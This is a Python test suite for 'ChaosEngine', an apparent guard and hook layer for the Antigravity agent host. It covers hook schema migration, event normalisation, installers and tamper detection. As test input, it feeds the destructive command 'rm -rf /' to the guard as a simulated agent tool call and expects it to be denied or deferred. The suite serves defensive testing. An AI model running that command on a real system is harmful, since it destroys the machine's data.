"""Antigravity (agy) hook schema, runtime protocol, installer, user layer, and doctor tests."""

from __future__ import annotations

import base64
import hashlib
import importlib.util
import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
import unittest
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parents[2]


def _load(name: str, path: Path):
    spec = importlib.util.spec_from_file_location(name, path)
    if spec is None or spec.loader is None:
        raise RuntimeError(f"cannot load {path}")
    module = importlib.util.module_from_spec(spec)
    sys.modules[name] = module
    spec.loader.exec_module(module)
    return module


class AntigravitySupportTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        if str(ROOT) not in sys.path:
            sys.path.insert(0, str(ROOT))
        cls.surfaces = _load("ce_agy_surfaces", ROOT / "runtime" / "hook_surfaces.py")
        cls.hosts = _load("ce_agy_hosts", ROOT / "runtime" / "hosts.py")
        cls.kernel = _load("ce_agy_kernel", ROOT / "hooks" / "kernel.py")
        cls.launch = _load("ce_agy_launch", ROOT / "hooks" / "launch.py")
        cls.conformance = _load("ce_agy_conformance", ROOT / "runtime" / "conformance.py")
        cls.install = _load("ce_agy_install", ROOT / "install.py")
        cls.bootstrap = _load("ce_agy_bootstrap", ROOT / "bootstrap.py")
        cls.user_layer = _load("ce_agy_user_layer", ROOT / "runtime" / "user_layer.py")

    def test_hooks_document_uses_named_hook_schema_and_migrates_legacy(self):
        document = self.surfaces.antigravity_hooks_document()
        self.assertEqual(["chaos-engine"], list(document.keys()))
        spec = document["chaos-engine"]
        self.assertIsInstance(spec, dict)
        for event in ("PreToolUse", "PostToolUse"):
            self.assertIn(event, spec)
            self.assertIn("matcher", spec[event][0])
            self.assertIn("hooks", spec[event][0])
        for event in ("SessionStart", "PreInvocation", "Stop"):
            self.assertIn(event, spec)
            self.assertNotIn("matcher", spec[event][0])
            self.assertEqual("command", spec[event][0]["type"])
        self.assertNotIn("PostInvocation", spec)

        # Legacy flat top-level ChaosEngine entries are migrated and foreign named hooks stay.
        legacy = {
            "my-linter": {
                "PostToolUse": [
                    {
                        "matcher": "edit_file",
                        "hooks": [{"type": "command", "command": "./lint.sh"}],
                    }
                ]
            },
            "PreToolUse": [
                {
                    "matcher": ".*",
                    "hooks": [
                        {
                            "type": "command",
                            "command": "python3 .chaos-engine/hooks/launch.py antigravity PreToolUse",
                        }
                    ],
                }
            ],
            "Stop": [
                {
                    "type": "command",
                    "command": "python3 .chaos-engine/hooks/launch.py antigravity Stop",
                }
            ],
        }
        merged = self.surfaces.merge_antigravity_hooks(legacy)
        self.assertIn("my-linter", merged)
        self.assertIn("chaos-engine", merged)
        self.assertNotIn("PreToolUse", merged)
        self.assertNotIn("Stop", merged)

        with tempfile.TemporaryDirectory() as temporary:
            project = Path(temporary)
            target = project / ".agents" / "hooks.json"
            target.parent.mkdir(parents=True)
            target.write_text(json.dumps(legacy), encoding="utf-8")
            self.surfaces.install_antigravity(project)
            written = json.loads(target.read_text(encoding="utf-8"))
            self.assertEqual({"my-linter", "chaos-engine"}, set(written))
            self.assertTrue(self.surfaces.uninstall_antigravity(project))
            remaining = json.loads(target.read_text(encoding="utf-8"))
            self.assertEqual({"my-linter"}, set(remaining))

    def test_conformance_registry_unwraps_named_antigravity_events(self):
        registry = self.conformance.production_hook_registry()
        self.assertEqual(
            {"SessionStart", "PreToolUse", "PostToolUse", "PreInvocation", "PostInvocation", "Stop"},
            registry["antigravity"],
        )

    def test_windows_command_is_cmd_safe_not_powershell(self):
        for event in ("PreToolUse", "PostToolUse", "SessionStart", "PreInvocation", "PostInvocation", "Stop"):
            command = self.hosts.chaos_guard_locator_command(
                windows=True, host="antigravity", event=event
            )
            self.assertNotIn("$a=", command)
            self.assertNotIn("Get-Command", command)
            self.assertIn("py -3 -c", command)
            self.assertIn(f"antigravity {event}", command)
            self.assertLessEqual(len(command), self.hosts.HOOK_COMMAND_MAX_CHARS)

    def test_kernel_normalizes_and_adapts_all_agy_events(self):
        event = self.kernel.normalize_event(
            {
                "conversationId": "conv-42",
                "hookEventName": "PreToolUse",
                "cwd": "/workspace",
                "toolCall": {
                    "id": "toolu_99",
                    "name": "run_command",
                    "args": {"CommandLine": "git status"},
                },
            },
            "antigravity",
        )
        self.assertEqual("PreToolUse", event.name)
        self.assertEqual("conv-42", event.session_id)
        self.assertEqual("toolu_99", event.tool_call_id)
        self.assertEqual("PowerShell", event.tool_name)
        self.assertEqual("git status", event.tool_input["command"])

        read_event = self.kernel.normalize_event(
            {
                "conversationId": "conv-42",
                "hookEventName": "PreToolUse",
                "toolCall": {
                    "id": "toolu_100",
                    "name": "read_file",
                    "args": {"Path": "/workspace/big.log", "StartLine": 1, "EndLine": 50},
                },
            },
            "antigravity",
        )
        self.assertEqual("Read", read_event.tool_name)
        self.assertEqual("/workspace/big.log", read_event.tool_input["file_path"])
        self.assertEqual(1, read_event.tool_input["startLine"])
        self.assertEqual(50, read_event.tool_input["endLine"])

        stop_event = self.kernel.normalize_event(
            {
                "conversationId": "conv-42",
                "hookEventName": "Stop",
                "continuationActive": True,
            },
            "antigravity",
        )
        self.assertTrue(stop_event.stop_hook_active)

        # Output adaptation for every AGY event
        ss = self.kernel.adapt_hook_output({"additionalContext": "hello"}, "SessionStart", "antigravity")
        self.assertEqual({"injectSteps": [{"systemMessage": {"systemMessage": "hello"}}]}, ss)

        pre_inv_ctx = self.kernel.adapt_hook_output(
            {"additionalContext": "ctx"}, "UserPromptSubmit", "antigravity", native_event="PreInvocation"
        )
        self.assertEqual({"injectSteps": [{"systemMessage": {"systemMessage": "ctx"}}]}, pre_inv_ctx)

        pre_inv_deny = self.kernel.adapt_hook_output(
            {"decision": "block", "reason": "nope"},
            "UserPromptSubmit",
            "antigravity",
            native_event="PreInvocation",
        )
        self.assertEqual(
            {
                "injectSteps": [{"errorMessage": {"userMessage": "nope"}}],
                "terminationBehavior": "terminate",
            },
            pre_inv_deny,
        )

        pre_allow = self.kernel.adapt_hook_output({}, "PreToolUse", "antigravity")
        self.assertEqual({"decision": "allow"}, pre_allow)

        pre_deny = self.kernel.adapt_hook_output(
            {"decision": "block", "reason": "unsafe"}, "PreToolUse", "antigravity"
        )
        self.assertEqual({"decision": "deny", "reason": "unsafe"}, pre_deny)

        post = self.kernel.adapt_hook_output(
            {"additionalContext": "ignored"}, "PostToolUse", "antigravity", native_event="PostToolUse"
        )
        self.assertEqual({}, post)

        stop = self.kernel.adapt_hook_output(
            {"decision": "block", "reason": "finish tests"}, "Stop", "antigravity"
        )
        self.assertEqual({"decision": "continue", "reason": "finish tests"}, stop)

    def test_live_launch_from_dot_agents_handles_session_start_and_pretool(self):
        with tempfile.TemporaryDirectory() as temporary:
            project = Path(temporary)
            subprocess.run(["git", "-C", str(project), "init", "-q"], check=True)
            overlay = project / ".chaos-engine"
            (overlay / "hooks").mkdir(parents=True)
            (overlay / "runtime").mkdir(parents=True)
            (overlay / "rules").mkdir(parents=True)
            (overlay / "companions").mkdir(parents=True)
            (overlay / "skills" / "chaos-engine").mkdir(parents=True)
            (project / ".agents").mkdir(parents=True)
            for name in (
                "launch.py",
                "guard.py",
                "kernel.py",
                "lifecycle.py",
                "matchers.json",
                "reflection.py",
                "repeat_reminder.py",
                "retrieve_justification.py",
                "session_scratch.py",
            ):
                src = ROOT / "hooks" / name
                if src.is_file():
                    (overlay / "hooks" / name).write_bytes(src.read_bytes())
            for name in (
                "stores.py",
                "user_paths.py",
                "delete_guard.py",
                "gate_fail_closed.py",
                "session_token_usage.py",
                "significance.py",
                "tool_output_store.py",
            ):
                src = ROOT / "runtime" / name
                if src.is_file():
                    (overlay / "runtime" / name).write_bytes(src.read_bytes())
            for name in ("large_read_deny.py", "ethics_check.py", "operation_boundary.py"):
                src = ROOT / "rules" / name
                if src.is_file():
                    (overlay / "rules" / name).write_bytes(src.read_bytes())
            (overlay / "identity.md").write_text("# Identity\n## Truth\n- Speak truth.\n", encoding="utf-8")
            (overlay / "skills" / "chaos-engine" / "SKILL.md").write_text("---\nname: chaos-engine\n---\n", encoding="utf-8")
            (project / "big.log").write_bytes(b"x" * 10000)

            env = os.environ.copy()
            env.pop("PYTHONPATH", None)
            trace = project / "trace.log"
            env["CE_HOOK_TRACE"] = str(trace)
            launcher = str(overlay / "hooks" / "launch.py")
            agents_dir = project / ".agents"

            # 1. SessionStart from .agents/ must not crash with No module named 'runtime'
            ss = subprocess.run(
                [sys.executable, launcher, "antigravity", "SessionStart"],
                input=json.dumps(
                    {
                        "conversationId": "agy-conv-1",
                        "workspacePaths": [str(project)],
                        "hookEventName": "SessionStart",
                        "cwd": str(project),
                    }
                ),
                cwd=agents_dir,
                capture_output=True,
                text=True,
                env=env,
                check=False,
            )
            self.assertEqual(0, ss.returncode, ss.stderr)
            self.assertNotIn("Hook protocol error", ss.stderr)
            ss_out = json.loads(ss.stdout)
            self.assertIn("injectSteps", ss_out)
            self.assertIn("ChaosEngine:", ss_out["injectSteps"][0]["systemMessage"]["systemMessage"])

            # 2. PreToolUse rm -rf / via AGY toolCall must deny with exit 0
            deny = subprocess.run(
                [sys.executable, launcher, "antigravity", "PreToolUse"],
                input=json.dumps(
                    {
                        "conversationId": "agy-conv-1",
                        "hookEventName": "PreToolUse",
                        "cwd": str(project),
                        "toolCall": {
                            "id": "toolu_rm",
                            "name": "run_command",
                            "args": {"CommandLine": "rm -rf /"},
                        },
                    }
                ),
                cwd=agents_dir,
                capture_output=True,
                text=True,
                env=env,
                check=False,
            )
            self.assertEqual(0, deny.returncode, deny.stderr)
            self.assertEqual("deny", json.loads(deny.stdout)["decision"])

            # 3. PreToolUse unmatched tool returns {"decision": "allow"} with exit 0
            unmatched = subprocess.run(
                [sys.executable, launcher, "antigravity", "PreToolUse"],
                input=json.dumps(
                    {
                        "conversationId": "agy-conv-1",
                        "hookEventName": "PreToolUse",
                        "cwd": str(project),
                        "toolCall": {
                            "id": "toolu_ask",
                            "name": "ask_question",
                            "args": {},
                        },
                    }
                ),
                cwd=agents_dir,
                capture_output=True,
                text=True,
                env=env,
                check=False,
            )
            self.assertEqual(0, unmatched.returncode, unmatched.stderr)
            self.assertEqual({"decision": "allow"}, json.loads(unmatched.stdout))

            # 4. Large unranged read_file with PascalCase Path denies; ranged with StartLine/EndLine allows
            large_deny = subprocess.run(
                [sys.executable, launcher, "antigravity", "PreToolUse"],
                input=json.dumps(
                    {
                        "conversationId": "agy-conv-1",
                        "hookEventName": "PreToolUse",
                        "cwd": str(project),
                        "toolCall": {
                            "id": "toolu_read1",
                            "name": "read_file",
                            "args": {"Path": str(project / "big.log")},
                        },
                    }
                ),
                cwd=agents_dir,
                capture_output=True,
                text=True,
                env=env,
                check=False,
            )
            self.assertEqual(0, large_deny.returncode, large_deny.stderr)
            self.assertEqual("deny", json.loads(large_deny.stdout)["decision"])

            ranged_allow = subprocess.run(
                [sys.executable, launcher, "antigravity", "PreToolUse"],
                input=json.dumps(
                    {
                        "conversationId": "agy-conv-1",
                        "hookEventName": "PreToolUse",
                        "cwd": str(project),
                        "toolCall": {
                            "id": "toolu_read2",
                            "name": "read_file",
                            "args": {"Path": str(project / "big.log"), "StartLine": 1, "EndLine": 10},
                        },
                    }
                ),
                cwd=agents_dir,
                capture_output=True,
                text=True,
                env=env,
                check=False,
            )
            self.assertEqual(0, ranged_allow.returncode, ranged_allow.stderr)
            self.assertEqual({"decision": "allow"}, json.loads(ranged_allow.stdout))

            # 5. State must not be written inside .agents/
            self.assertFalse((agents_dir / ".chaos-engine-state").exists())

            # 6. Trace recorded conversationId and toolCall.id
            lines = trace.read_text(encoding="utf-8").splitlines()
            self.assertTrue(any("agy-conv-1\ttoolu_rm" in line for line in lines), lines)

    def test_doctor_flags_legacy_top_level_antigravity_hooks(self):
        legacy = {
            "PreToolUse": [
                {
                    "matcher": ".*",
                    "hooks": [
                        {
                            "type": "command",
                            "command": "python3 .chaos-engine/hooks/launch.py antigravity PreToolUse",
                        }
                    ],
                }
            ]
        }
        findings = self.surfaces.antigravity_hooks_findings(legacy)
        self.assertTrue(findings)
        valid = self.surfaces.antigravity_hooks_document()
        self.assertEqual([], self.surfaces.antigravity_hooks_findings(valid))

    def test_installer_host_selection_detection_and_user_layer_support_agy(self):
        self.assertIn("antigravity", self.bootstrap.INSTALL_HOST_IDS)
        self.assertEqual(("antigravity",), self.bootstrap.parse_install_hosts("antigravity"))
        self.assertEqual(("antigravity",), self.bootstrap.parse_install_hosts("agy"))
        self.assertEqual("agy", self.kernel.HOST_CAPABILITIES["antigravity"].cli)

        detected = dict(
            (host_id, found)
            for host_id, _label, found in self.bootstrap.detect_install_hosts(
                which=lambda name: "/usr/bin/agy" if name == "agy" else None
            )
        )
        self.assertTrue(detected["antigravity"])

        with tempfile.TemporaryDirectory() as temporary:
            project = Path(temporary) / "proj"
            project.mkdir()
            self.install.apply_install_host_completion(project, ("antigravity",))
            hooks_file = project / ".agents" / "hooks.json"
            self.assertTrue(hooks_file.is_file())
            self.assertIn("chaos-engine", json.loads(hooks_file.read_text(encoding="utf-8")))
            self.assertFalse((project / ".cursor" / "hooks.json").exists())

            # User layer writes ~/.gemini/config/hooks.json in AGY named-hook format
            root = Path(temporary) / "u"
            home = root / "home"
            env = os.environ.copy()
            env["CHAOS_ENGINE_USER_HOME"] = str(home)
            env["CHAOS_ENGINE_USER_DIR"] = str(root / "data")
            env["CHAOS_ENGINE_CONFIG_HOME"] = str(root / "config")
            env["CHAOS_ENGINE_STATE_DIR"] = str(root / "state")
            env["CHAOS_ENGINE_CACHE_DIR"] = str(root / "cache")
            with mock.patch.dict(os.environ, env, clear=True):
                result = self.user_layer.install_user_layer(
                    home=home,
                    project=project,
                    source=ROOT,
                    commit="a" * 40,
                    hosts=("antigravity",),
                    hooks=True,
                )
            self.assertEqual("installed", result["status"])
            user_hooks = home / ".gemini" / "config" / "hooks.json"
            self.assertTrue(user_hooks.is_file())
            parsed = json.loads(user_hooks.read_text(encoding="utf-8"))
            self.assertIn("chaos-engine-user", parsed)
            self.assertIn("PreToolUse", parsed["chaos-engine-user"])
            self.assertIn("SessionStart", parsed["chaos-engine-user"])
            self.assertTrue(
                (home / ".gemini" / "config" / "skills" / "chaos-engine-user" / "SKILL.md").is_file()
            )
            with mock.patch.dict(os.environ, env, clear=True):
                self.user_layer.uninstall_user_layer(home)
            self.assertFalse(user_hooks.exists())

    def test_user_layer_deferral_from_global_dir_and_valid_json_stdout(self):
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            home = root / "home"
            project = root / "project"
            (project / ".chaos-engine").mkdir(parents=True)
            (project / ".chaos-engine" / "install.py").write_text("# project\n", encoding="utf-8")
            (project / ".agents").mkdir(parents=True)
            agy_dir = home / ".gemini" / "config"
            agy_dir.mkdir(parents=True)

            env = os.environ.copy()
            env["CHAOS_ENGINE_USER_HOME"] = str(home)
            env["CHAOS_ENGINE_USER_DIR"] = str(root / "data")
            env["CHAOS_ENGINE_CONFIG_HOME"] = str(root / "config")
            env["CHAOS_ENGINE_STATE_DIR"] = str(root / "state")
            env["CHAOS_ENGINE_CACHE_DIR"] = str(root / "cache")
            with mock.patch.dict(os.environ, env, clear=True):
                self.user_layer.install_user_layer(
                    home=home,
                    project=project,
                    source=ROOT,
                    commit="a" * 40,
                    hosts=("agy",),
                    hooks=True,
                )
            self.assertTrue((agy_dir / "hooks.json").is_file())
            layer_marker = project / ".chaos-engine-state" / "sessions" / "conv-defer.layer"
            layer_marker.parent.mkdir(parents=True)
            layer_marker.write_text("project\n", encoding="utf-8")
            launch = root / "data" / "current" / "launch.py"

            # User-layer PreToolUse run from ~/.gemini/config/ must defer and emit {"decision":"allow"}
            deferred_pre = subprocess.run(
                [sys.executable, str(launch), "antigravity", "PreToolUse", "--layer", "user"],
                input=json.dumps(
                    {
                        "conversationId": "conv-defer",
                        "hookEventName": "PreToolUse",
                        "cwd": str(project),
                        "toolCall": {
                            "id": "t1",
                            "name": "run_command",
                            "args": {"CommandLine": "rm -rf /"},
                        },
                    }
                ),
                cwd=agy_dir,
                capture_output=True,
                text=True,
                env=env,
                check=False,
            )
            self.assertEqual(0, deferred_pre.returncode, deferred_pre.stderr)
            self.assertEqual({"decision": "allow"}, json.loads(deferred_pre.stdout))

            # User-layer SessionStart deferral emits {}
            deferred_ss = subprocess.run(
                [sys.executable, str(launch), "antigravity", "SessionStart", "--layer", "user"],
                input=json.dumps(
                    {
                        "conversationId": "conv-defer",
                        "hookEventName": "SessionStart",
                        "workspacePaths": [str(project)],
                    }
                ),
                cwd=agy_dir,
                capture_output=True,
                text=True,
                env=env,
                check=False,
            )
            self.assertEqual(0, deferred_ss.returncode, deferred_ss.stderr)
            self.assertEqual({}, json.loads(deferred_ss.stdout))

    def test_unix_locator_fails_closed_exit_zero_json_when_launcher_missing(self):
        with tempfile.TemporaryDirectory() as temporary:
            empty = Path(temporary) / ".agents"
            empty.mkdir(parents=True)
            pre_cmd = self.hosts.chaos_guard_locator_command(
                windows=False, host="antigravity", event="PreToolUse"
            )
            res = subprocess.run(
                ["/bin/sh", "-c", pre_cmd],
                cwd=empty,
                capture_output=True,
                text=True,
                check=False,
            )
            self.assertEqual(0, res.returncode, res.stderr)
            self.assertEqual("deny", json.loads(res.stdout)["decision"])

            pre_inv_cmd = self.hosts.chaos_guard_locator_command(
                windows=False, host="antigravity", event="PreInvocation"
            )
            res_inv = subprocess.run(
                ["/bin/sh", "-c", pre_inv_cmd],
                cwd=empty,
                capture_output=True,
                text=True,
                check=False,
            )
            self.assertEqual(0, res_inv.returncode, res_inv.stderr)
            self.assertEqual("terminate", json.loads(res_inv.stdout)["terminationBehavior"])

    def test_agy_ide_tool_args_and_aliases_and_foreign_doctor_hooks(self):
        # AbsolutePath, TargetFile, SearchDirectory normalization
        view_ev = self.kernel.normalize_event(
            {
                "conversationId": "c1",
                "hookEventName": "PreToolUse",
                "toolCall": {
                    "id": "t1",
                    "name": "view_file",
                    "args": {"AbsolutePath": "/repo/big.log"},
                },
            },
            "antigravity",
        )
        self.assertEqual("Read", view_ev.tool_name)
        self.assertEqual("/repo/big.log", view_ev.tool_input["file_path"])

        write_ev = self.kernel.normalize_event(
            {
                "conversationId": "c1",
                "hookEventName": "PreToolUse",
                "toolCall": {
                    "id": "t2",
                    "name": "write_to_file",
                    "args": {"TargetFile": "/repo/app.py"},
                },
            },
            "antigravity",
        )
        self.assertEqual("Write", write_ev.tool_name)
        self.assertEqual("/repo/app.py", write_ev.tool_input["file_path"])

        find_ev = self.kernel.normalize_event(
            {
                "conversationId": "c1",
                "hookEventName": "PreToolUse",
                "toolCall": {
                    "id": "t3",
                    "name": "find_by_name",
                    "args": {"SearchDirectory": "/repo/src"},
                },
            },
            "antigravity",
        )
        self.assertEqual("Glob", find_ev.tool_name)
        self.assertEqual("/repo/src", find_ev.tool_input["path"])

        # PostInvocation block & direct native event name
        post_inv_deny = self.kernel.adapt_hook_output(
            {"decision": "block", "reason": "stop now"}, "PostInvocation", "antigravity"
        )
        self.assertEqual("terminate", post_inv_deny["terminationBehavior"])
        self.assertEqual("stop now", post_inv_deny["injectSteps"][0]["errorMessage"]["userMessage"])

        # agy alias in install_config and guard._INSTALL_HOST_IDS
        install_config = _load("ce_agy_install_config", ROOT / "runtime" / "install_config.py")
        guard = _load("ce_agy_guard_alias", ROOT / "hooks" / "guard.py")
        self.assertIn("antigravity", guard._INSTALL_HOST_IDS)
        self.assertIn("agy", guard._INSTALL_HOST_IDS)
        with tempfile.TemporaryDirectory() as temporary:
            project = Path(temporary)
            resolved = install_config.resolve_config(
                project=project,
                environ={"CHAOS_ENGINE_HOST": "agy", "CHAOS_ENGINE_USER_HOSTS": "agy"},
                explicit_config=project / "absent.toml",
            )
            self.assertEqual(("antigravity",), resolved.values["hosts.enabled"])
            self.assertEqual(("antigravity",), resolved.values["user_layer.hosts"])

            # Foreign-only .agents/hooks.json with --hosts claude does not emit false doctor finding
            (project / ".agents").mkdir()
            (project / ".agents" / "hooks.json").write_text(
                json.dumps({"my-linter": {"PostToolUse": []}}), encoding="utf-8"
            )
            (project / ".chaos-engine-state").mkdir()
            (project / ".chaos-engine-state" / "host-completion.json").write_text(
                json.dumps({"schemaVersion": 1, "targets": ["claude"]}), encoding="utf-8"
            )
            self.assertEqual([], self.hosts.installed_hook_drift(project))

        # launch.py stays free of os.chdir( (required by host preflight contract)
        self.assertNotIn("os.chdir(", (ROOT / "hooks" / "launch.py").read_text(encoding="utf-8"))

    def test_windows_user_layer_command_is_cmd_and_powershell_safe(self):
        with mock.patch.object(self.user_layer.os, "name", "nt"):
            cmd = self.user_layer._stable_command(
                Path("C:/Users/Jane Doe/AppData/Local/chaos-engine/current/launch.py"),
                "antigravity",
                "PreToolUse",
            )
        self.assertFalse(cmd.startswith('"'), cmd)
        self.assertEqual(2, cmd.count('"'), cmd)
        self.assertIn("py -3 ", cmd)
        self.assertIn("antigravity PreToolUse --layer user", cmd)

    def test_user_layer_session_start_from_global_config_does_not_pollute_config_dir(self):
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            home = root / "home"
            project = root / "project"
            project.mkdir(parents=True)
            agy_dir = home / ".gemini" / "config"
            agy_dir.mkdir(parents=True)

            env = os.environ.copy()
            env["CHAOS_ENGINE_USER_HOME"] = str(home)
            env["CHAOS_ENGINE_USER_DIR"] = str(root / "data")
            env["CHAOS_ENGINE_CONFIG_HOME"] = str(root / "config")
            env["CHAOS_ENGINE_STATE_DIR"] = str(root / "state")
            env["CHAOS_ENGINE_CACHE_DIR"] = str(root / "cache")
            with mock.patch.dict(os.environ, env, clear=True):
                self.user_layer.install_user_layer(
                    home=home,
                    project=project,
                    source=ROOT,
                    commit="a" * 40,
                    hosts=("antigravity",),
                    hooks=True,
                )
            launch = root / "data" / "current" / "launch.py"
            res = subprocess.run(
                [sys.executable, str(launch), "agy", "SessionStart", "--layer", "user"],
                input=json.dumps(
                    {
                        "conversationId": "conv-global-only",
                        "hookEventName": "SessionStart",
                        "workspacePaths": [str(project)],
                    }
                ),
                cwd=agy_dir,
                capture_output=True,
                text=True,
                env=env,
                check=False,
            )
            self.assertEqual(0, res.returncode, res.stderr)
            out = json.loads(res.stdout)
            self.assertIn("injectSteps", out)
            self.assertFalse((agy_dir / ".chaos-engine-state").exists())

    def _overlay_project(self, project: Path) -> Path:
        overlay = project / ".chaos-engine"
        shutil.copytree(ROOT / "hooks", overlay / "hooks")
        shutil.copytree(ROOT / "rules", overlay / "rules")
        (overlay / "runtime").mkdir()
        for name in (
            "stores.py",
            "user_paths.py",
            "delete_guard.py",
            "gate_fail_closed.py",
            "session_token_usage.py",
            "significance.py",
            "tool_output_store.py",
            "retrieve.py",
        ):
            source = ROOT / "runtime" / name
            if source.is_file():
                (overlay / "runtime" / name).write_bytes(source.read_bytes())
        (overlay / "companions").mkdir()
        (overlay / "references").mkdir()
        (overlay / "skills" / "chaos-engine").mkdir(parents=True)
        (overlay / "companions" / "ethics-card.md").write_text("ethics\n", encoding="utf-8")
        (overlay / "references" / "token-budget-modes.md").write_text("budget\n", encoding="utf-8")
        (overlay / "identity.md").write_text(
            "# Identity\n## Truth\n- Speak truth.\n## Principles\n- Lean.\n",
            encoding="utf-8",
        )
        (overlay / "skills" / "chaos-engine" / "SKILL.md").write_text(
            "---\nname: chaos-engine\n---\n", encoding="utf-8"
        )
        (overlay / "tool.py").write_text(
            "import subprocess\n"
            "def go(argv):\n"
            "    subprocess.run(argv)\n"
            "WORDS = ('git', 'push', 'reset', 'merge')\n",
            encoding="utf-8",
        )
        (overlay / "install.py").write_text("# stub\n", encoding="utf-8")
        evil = project / "evil"
        evil.mkdir()
        (evil / "tool.py").write_text(
            (overlay / "tool.py").read_text(encoding="utf-8"), encoding="utf-8"
        )
        agents = project / ".agents"
        agents.mkdir()
        return agents

    def _agy(self, project: Path, agents: Path, event: str, payload: dict) -> subprocess.CompletedProcess[str]:
        env = os.environ.copy()
        env.pop("PYTHONPATH", None)
        env["CHAOS_ENGINE_HOST"] = "antigravity"
        return subprocess.run(
            [sys.executable, str(project / ".chaos-engine" / "hooks" / "launch.py"), "antigravity", event],
            input=json.dumps(payload),
            cwd=agents,
            capture_output=True,
            text=True,
            env=env,
            check=False,
        )

    def test_agents_hooks_json_is_in_the_receipt_and_doctor_sees_tampering(self):
        with tempfile.TemporaryDirectory() as temporary:
            project = Path(temporary) / "consumer"
            canonical = project / ".chaos-engine/skills/chaos-engine/SKILL.md"
            canonical.parent.mkdir(parents=True)
            canonical.write_text("# ChaosEngine\n", encoding="utf-8")
            first = self.hosts.install(project, core_commit="1" * 40)
            self.assertIn(".agents/hooks.json", first["after"])
            self.assertIn(".agents/hooks.json", first["hookHashes"])
            disk = json.loads((project / ".chaos-engine-hosts.json").read_text(encoding="utf-8"))
            stored = disk["after"][".agents/hooks.json"]
            self.assertIsInstance(stored, dict)
            self.assertEqual(
                stored["sha256"],
                hashlib.sha256(base64.b64decode(first["after"][".agents/hooks.json"])).hexdigest(),
            )
            blob = project / stored["blob"]
            self.assertEqual(stored["sha256"], hashlib.sha256(blob.read_bytes()).hexdigest())
            self.hosts.install(project, core_commit="2" * 40)
            upgraded = json.loads((project / ".chaos-engine-hosts.json").read_text(encoding="utf-8"))
            previous = upgraded["rollbackPreviousReceipt"]
            self.assertIsInstance(previous, str)
            nested = json.loads(base64.b64decode(previous))
            self.assertIsInstance(nested["after"][".agents/hooks.json"], dict)
            self.assertLess((project / ".chaos-engine-hosts.json").stat().st_size, 100_000)
            self.assertTrue(self.hosts.rollback_previous_receipt(project, "1" * 40))
            target = project / ".agents" / "hooks.json"
            target.write_text(target.read_text(encoding="utf-8") + "\n", encoding="utf-8")
            result: dict = {"status": "healthy"}
            self.install._verify_hosts_into_doctor_result(
                result,
                project,
                self.hosts,
                {"source": {"commit": "2" * 40}},
                host_adapter_drift=False,
                pending_rollback=None,
            )
            self.assertEqual("recovery-required", result["hosts"]["status"])
            self.assertIn(".agents/hooks.json", str(result["hosts"].get("detail")))

    def test_tool_py_retrieve_is_allowed_and_a_denied_retrieve_is_not_marked(self):
        with tempfile.TemporaryDirectory() as temporary:
            project = Path(temporary)
            agents = self._overlay_project(project)
            allowed = self._agy(
                project,
                agents,
                "PreToolUse",
                {
                    "conversationId": "s-allow",
                    "hookEventName": "PreToolUse",
                    "cwd": str(project),
                    "toolCall": {
                        "id": "toolu_retrieve",
                        "name": "run_command",
                        "args": {"CommandLine": 'python3 .chaos-engine/tool.py retrieve "test"'},
                    },
                },
            )
            self.assertEqual(0, allowed.returncode, allowed.stderr)
            self.assertEqual("allow", json.loads(allowed.stdout)["decision"])
            denied = self._agy(
                project,
                agents,
                "PreToolUse",
                {
                    "conversationId": "s-deny",
                    "hookEventName": "PreToolUse",
                    "cwd": str(project),
                    "toolCall": {
                        "id": "toolu_evil",
                        "name": "run_command",
                        "args": {"CommandLine": 'python3 evil/tool.py retrieve "test"'},
                    },
                },
            )
            self.assertEqual(0, denied.returncode, denied.stderr)
            self.assertEqual("deny", json.loads(denied.stdout)["decision"])
            denied_state = json.loads(
                (project / ".chaos-engine-state" / "retrieve-justification.json").read_text(
                    encoding="utf-8"
                )
            )
            self.assertNotEqual("s-deny", denied_state.get("awaitingReceipt"))
            justification = _load(
                "ce_agy_justification_deny",
                project / ".chaos-engine" / "hooks" / "retrieve_justification.py",
            )
            justification.record_store_outcome(
                project, "mempalace", "degraded", "test", "", "denied-before-execution"
            )
            payload = json.loads(
                (project / ".chaos-engine-state" / "retrieve-justification.json").read_text(encoding="utf-8")
            )
            row = (payload.get("sessions") or {}).get("s-deny") or {}
            self.assertIsNot(row.get("retrieved"), True)

    def test_subdirectory_tool_py_retrieve_is_allowed(self):
        with tempfile.TemporaryDirectory() as temporary:
            project = Path(temporary)
            agents = self._overlay_project(project)
            sub = project / "sub"
            sub.mkdir()
            evil = sub / "evil"
            evil.mkdir()
            (evil / "tool.py").write_text(
                (project / ".chaos-engine" / "tool.py").read_text(encoding="utf-8"),
                encoding="utf-8",
            )
            tool = project / ".chaos-engine" / "tool.py"
            commands = (
                'python3 ../.chaos-engine/tool.py retrieve "test"',
                f"python3 {tool} retrieve \"test\"",
            )
            for index, command in enumerate(commands):
                allowed = self._agy(
                    project,
                    agents,
                    "PreToolUse",
                    {
                        "conversationId": f"s-sub-{index}",
                        "hookEventName": "PreToolUse",
                        "cwd": str(sub),
                        "toolCall": {
                            "id": f"toolu_sub_{index}",
                            "name": "run_command",
                            "args": {"CommandLine": command},
                        },
                    },
                )
                self.assertEqual(0, allowed.returncode, allowed.stderr)
                self.assertEqual("allow", json.loads(allowed.stdout)["decision"], command)
            denied = self._agy(
                project,
                agents,
                "PreToolUse",
                {
                    "conversationId": "s-sub-deny",
                    "hookEventName": "PreToolUse",
                    "cwd": str(sub),
                    "toolCall": {
                        "id": "toolu_sub_evil",
                        "name": "run_command",
                        "args": {"CommandLine": 'python3 evil/tool.py retrieve "test"'},
                    },
                },
            )
            self.assertEqual(0, denied.returncode, denied.stderr)
            self.assertEqual("deny", json.loads(denied.stdout)["decision"])

    def test_stop_ignores_not_idle_and_terminal_reasons(self):
        with tempfile.TemporaryDirectory() as temporary:
            project = Path(temporary)
            agents = self._overlay_project(project)
            state = project / ".chaos-engine-state"
            state.mkdir(parents=True)
            (state / "retrieve-justification.json").write_text(
                json.dumps(
                    {
                        "schemaVersion": 1,
                        "sessions": {
                            "s-stop": {
                                "retrieved": False,
                                "retrieveOwed": True,
                                "updated": time.time(),
                            }
                        },
                    }
                ),
                encoding="utf-8",
            )
            owing = self._agy(
                project,
                agents,
                "Stop",
                {
                    "conversationId": "s-stop",
                    "hookEventName": "Stop",
                    "cwd": str(project),
                    "fullyIdle": True,
                },
            )
            self.assertEqual(0, owing.returncode, owing.stderr)
